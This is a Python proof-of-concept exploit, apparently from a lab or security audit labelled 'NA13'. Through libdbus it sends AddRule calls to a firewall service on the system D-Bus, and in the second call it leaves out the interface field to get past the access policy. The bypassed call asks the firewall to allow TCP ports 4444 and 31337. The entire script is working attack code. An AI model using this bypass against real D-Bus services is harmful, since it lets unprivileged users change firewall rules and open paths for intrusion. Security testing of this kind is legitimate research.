#!/usr/bin/env python3
"""NA13: INTERFACE omission → Firewall1 AddRule bypass
Uses dbus_message_new_method_call with interface=NULL"""
import ctypes, ctypes.util, os

print(f"uid={os.getuid()}")

libdbus = ctypes.CDLL(ctypes.util.find_library("dbus-1"))

class DBusError(ctypes.Structure):
    _fields_ = [("name", ctypes.c_char_p), ("message", ctypes.c_char_p),
                 ("d1", ctypes.c_uint), ("d2", ctypes.c_uint),
                 ("d3", ctypes.c_uint), ("d4", ctypes.c_uint), ("d5", ctypes.c_void_p)]

libdbus.dbus_error_init.argtypes = [ctypes.POINTER(DBusError)]
libdbus.dbus_error_init.restype = None
libdbus.dbus_error_is_set.argtypes = [ctypes.POINTER(DBusError)]
libdbus.dbus_error_is_set.restype = ctypes.c_int
libdbus.dbus_connection_open.argtypes = [ctypes.c_char_p, ctypes.POINTER(DBusError)]
libdbus.dbus_connection_open.restype = ctypes.c_void_p
libdbus.dbus_bus_register.argtypes = [ctypes.c_void_p, ctypes.POINTER(DBusError)]
libdbus.dbus_bus_register.restype = ctypes.c_int
libdbus.dbus_message_new_method_call.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p]
libdbus.dbus_message_new_method_call.restype = ctypes.c_void_p
libdbus.dbus_connection_send_with_reply_and_block.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int, ctypes.POINTER(DBusError)]
libdbus.dbus_connection_send_with_reply_and_block.restype = ctypes.c_void_p
libdbus.dbus_message_unref.argtypes = [ctypes.c_void_p]
libdbus.dbus_message_unref.restype = None

# For appending string arg
libdbus.dbus_message_iter_init_append.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
libdbus.dbus_message_iter_init_append.restype = None
libdbus.dbus_message_iter_append_basic.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p]
libdbus.dbus_message_iter_append_basic.restype = ctypes.c_int

DBUS_TYPE_STRING = ord('s')

# DBusMessageIter is opaque, allocate enough space
class DBusMessageIter(ctypes.Structure):
    _fields_ = [("dummy", ctypes.c_byte * 256)]

err = DBusError()
libdbus.dbus_error_init(ctypes.byref(err))
conn = libdbus.dbus_connection_open(b"unix:path=/run/dbus/system_bus_socket", ctypes.byref(err))
if not conn:
    n = err.name.decode() if err.name else "?"
    m = err.message.decode() if err.message else "?"
    print(f"Connect failed: {n}: {m}")
    exit(1)
err2 = DBusError()
libdbus.dbus_error_init(ctypes.byref(err2))
libdbus.dbus_bus_register(conn, ctypes.byref(err2))
print("Connected to system bus\n")

def send_addrul(conn, interface_val, rule_text, label):
    print(f"--- {label} ---")
    msg = libdbus.dbus_message_new_method_call(
        b"com.example.Firewall1", b"/com/example/Firewall1",
        interface_val, b"AddRule")
    if not msg:
        print("  Failed to create message")
        return

    # Append string argument using iter API
    it = DBusMessageIter()
    libdbus.dbus_message_iter_init_append(msg, ctypes.byref(it))
    val = ctypes.c_char_p(rule_text)
    libdbus.dbus_message_iter_append_basic(ctypes.byref(it), DBUS_TYPE_STRING, ctypes.byref(val))

    e = DBusError()
    libdbus.dbus_error_init(ctypes.byref(e))
    r = libdbus.dbus_connection_send_with_reply_and_block(conn, msg, 5000, ctypes.byref(e))
    if r:
        print("  Got reply — AddRule executed!")
        libdbus.dbus_message_unref(r)
    else:
        if libdbus.dbus_error_is_set(ctypes.byref(e)):
            n = e.name.decode() if e.name else "?"
            print(f"  Denied: {n}")
        else:
            print("  Failed (unknown)")
    libdbus.dbus_message_unref(msg)

# Test 1: WITH INTERFACE
send_addrul(conn, b"com.example.Firewall1.Control",
            b"ALLOW tcp 0.0.0.0:4444 (with interface)", "Test 1: WITH INTERFACE")

# Test 2: WITHOUT INTERFACE
send_addrul(conn, None,
            b"ALLOW tcp 0.0.0.0:31337 (NO INTERFACE - bypass)", "Test 2: WITHOUT INTERFACE (bypass)")
